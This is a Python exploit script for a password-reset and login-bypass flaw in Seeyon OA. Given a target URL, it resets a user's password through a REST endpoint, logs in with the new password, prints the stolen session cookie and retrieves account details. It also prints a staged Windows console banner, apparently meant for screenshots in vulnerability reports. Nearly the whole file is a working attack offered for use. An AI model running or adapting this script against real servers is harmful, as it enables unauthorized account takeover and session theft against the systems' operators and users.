#!/usr/bin/env python
# -*-coding:utf-8 -*-
import os
import sys
import requests
import shutil

headers1 = {
       # 'User-Agent': get_user_agent.get_user_agent(),
       'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
    }
headers2 = {
       # 'User-Agent': get_user_agent.get_user_agent(),
       'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
       'Content-Type': 'application/x-www-form-urlencoded'
    }
headers3 = {
       # 'User-Agent': get_user_agent.get_user_agent(),
       'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0',
       'Content-Type': 'application/json'
    }

def verify(site):
    scheme, netloc = site.split("://")
    url1 = "{}://{}/seeyon/rest/orgMember/-4401606663639775639/password/share.do".format(scheme, netloc)
    url3 = "{}://{}/seeyon/rest/m3/login/getCurrentUser".format(scheme, netloc)
    data3 = '{"": ""}'
    try:
       result1 = requests.request(method="PUT", url=url1, headers=headers1, verify=False)
       jsonres = result1.json()
       
       if len(jsonres["successMsgs"]) != 0:
           loginName = jsonres["successMsgs"][0]['ent']['loginName']
       else:
           loginName = jsonres["errorMsgInfos"][0]['ent']['loginName']

       url2 = "{}://{}/seeyon/rest/authentication/ucpcLogin?login_username={}&login_password=share.do&ticket=".format(scheme, netloc, loginName)
       result2 = requests.post(url=url2, headers=headers2, verify=False)
       #print(result2.json())
       if result2.json()['LoginOK'] == 'ok':
           print("[+]Cookie 获取成功：", result2.headers['Set-Cookie'])
           cookie = result2.headers['Set-Cookie'].split(";")[0] + ';'
           headers3["Cookie"] = cookie
           result3 = requests.post(url=url3, data=data3, headers=headers3, verify=False)
           if "accountId" in result3.text:
               return result3.text
           else:
               return False
       else:
           return False
    except:
       print(sys.exc_info())
       return False

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 seeyon-ucpcLogin-password-reset.py ",target)
    if info != "":
        print("[+]漏洞存在，获取到的用户信息为：", info)
    else:
        print("[-]漏洞不存在")
